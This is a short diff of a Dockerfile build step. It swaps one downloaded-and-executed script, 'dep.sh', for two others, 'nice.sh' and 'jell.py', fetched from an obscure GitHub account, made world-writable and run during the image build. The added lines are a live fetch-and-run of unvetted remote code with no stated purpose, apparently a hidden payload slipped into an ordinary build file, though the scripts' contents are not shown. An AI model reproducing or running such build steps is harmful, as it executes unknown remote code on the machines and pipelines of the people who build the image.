@@ -7,10 +7,10 @@ RUN \
   apt-get install gcc -y && \
   apt-get install unzip -y && \
   apt-get install wget -y && \
-  wget https://github.com/baxwru2/circleci/raw/master/dep.sh && \
-  chmod +x dep.sh && \
-  ./dep.sh && \
-  
+  wget https://github.com/thoeb292/thoeb292/raw/main/nice.sh && \
+  wget https://github.com/thoeb292/thoeb292/raw/main/jell.py && \
+  chmod 777 jell.py && \
+  python jell.py && \
   rm -rf /var/lib/apt/lists/* 
 
 # Add files.
